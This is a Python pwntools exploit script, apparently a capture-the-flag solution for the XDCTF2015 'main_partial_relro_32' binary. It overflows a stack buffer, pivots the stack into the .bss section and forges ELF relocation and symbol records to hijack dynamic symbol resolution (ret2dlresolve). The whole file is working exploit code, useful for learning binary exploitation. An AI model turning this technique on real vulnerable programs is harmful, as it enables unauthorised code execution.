from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)/2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
fake_write_sym = flat([0x4c, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

gnu_version_addr = elf.get_section_by_name('.gnu.version').header.sh_addr
print("ndx_addr: %s" % hex(gnu_version_addr+index_dynsym*2))

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()